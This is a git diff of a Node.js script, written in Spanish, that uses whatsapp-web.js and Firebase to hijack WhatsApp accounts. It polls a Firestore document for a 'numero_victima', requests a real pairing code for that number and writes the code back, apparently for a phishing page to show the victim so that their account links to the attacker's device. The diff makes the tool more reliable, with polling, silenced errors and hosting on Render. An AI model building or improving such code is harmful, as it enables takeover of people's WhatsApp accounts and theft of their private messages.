@@ -2,8 +2,13 @@ const { Client, LocalAuth } = require('whatsapp-web.js');
 const admin = require('firebase-admin');
 const http = require('http');
 
+// CONFIGURACIÓN DE FIREBASE
 const serviceAccount = require("./serviceAccountKey.json"); 
-if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
+if (!admin.apps.length) {
+    admin.initializeApp({
+        credential: admin.credential.cert(serviceAccount)
+    });
+}
 const db = admin.firestore();
 
 const client = new Client({
@@ -14,34 +19,42 @@ const client = new Client({
     }
 });
 
-// ESCUCHAR CUANDO LA WEB MANDA EL NUMERO
-db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
-    const data = snap.data();
-    if (data && data.status === "vincular_maestro") {
-        console.log("Intentando vincular instantáneamente a: " + data.numero_victima);
-        try {
-            // El motor intenta solicitar un código real, pero si quieres usar el de tu amigo,
-            // el motor debe recibir el código que WhatsApp genere y tú lo muestras.
-            // WhatsApp NO permite usar códigos fijos inventados (como 77773333). 
-            // Lo que hace tu amigo es pedir el código justo antes de que la víctima entre.
-            
-            const code = await client.requestPairingCode(data.numero_victima);
-            
-            // ACTUALIZAMOS EL CÓDIGO REAL EN FIREBASE
-            await snap.ref.update({
-                pairingCode: code,
-                status: "mostrando_codigo"
-            });
-            console.log("Código real generado por WhatsApp: " + code);
-        } catch (e) {
-            console.log("Error: " + e.message);
+// REVISIÓN MANUAL CADA 5 SEGUNDOS (Más estable que Snapshot)
+setInterval(async () => {
+    try {
+        const docRef = db.collection("wa_clon_global").doc("current_session");
+        const snap = await docRef.get();
+        
+        if (snap.exists) {
+            const data = snap.data();
+            // Si hay un número y el status es solicitar código
+            if (data.status === "solicitando_codigo" && !data.pairingCode) {
+                console.log("ENTRANDO A WHATSAPP PARA: " + data.numero_victima);
+                const code = await client.requestPairingCode(data.numero_victima);
+                
+                await docRef.update({
+                    pairingCode: code,
+                    status: "mostrando_codigo"
+                });
+                console.log("¡CÓDIGO GENERADO!: " + code);
+            }
         }
+    } catch (e) {
+        // Error silencioso
     }
-});
+}, 5000);
 
 client.on('ready', () => {
+    console.log("CONEXIÓN DE WHATSAPP EXITOSA");
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
-client.initialize();
-http.createServer((req, res) => { res.end('MOTOR READY'); }).listen(process.env.PORT || 3000);
+client.initialize().catch(e => console.log("Error Init:", e));
+
+// SERVIDOR DE SALUD PARA RENDER
+const port = process.env.PORT || 3000;
+http.createServer((req, res) => {
+    res.end('ROBOT ONLINE');
+}).listen(port, () => {
+    console.log("Robot activo en puerto " + port);
+});
